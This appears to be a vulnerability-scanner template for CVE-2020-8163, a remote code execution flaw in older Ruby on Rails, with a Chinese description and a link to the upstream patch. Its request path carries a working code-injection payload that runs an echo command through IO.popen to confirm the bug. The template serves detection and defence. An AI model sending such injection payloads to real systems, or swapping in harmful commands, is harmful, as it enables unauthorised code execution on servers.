id: CVE-2020-8163
info:
  name: Potential Remote Code Execution on Rails
  author:
  - l0ne1y
  description: |-
    Rails < 5.0.1 local names 远程代码执行漏洞
    Ruby on Rails是Rails团队的一套基于Ruby语言的开源Web应用框架。

    Ruby on Rails 5.0.1之前版本中存在代码注入漏洞。远程攻击者可利用该漏洞执行代码。
  severity: critical
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://github.com/rails/rails/commit/b395acf4673045c03fc7845b5103b801f0a5950d
requests:
- matchers:
  - type: dsl
    dsl:
    - status_code == 200 && contains(body,randstr) && !contains(body,'IO.popen')
  path:
  - '{{BaseURL}}?IO.popen(%27echo%20{{randstr}}).read%0A%23'
  method: GET
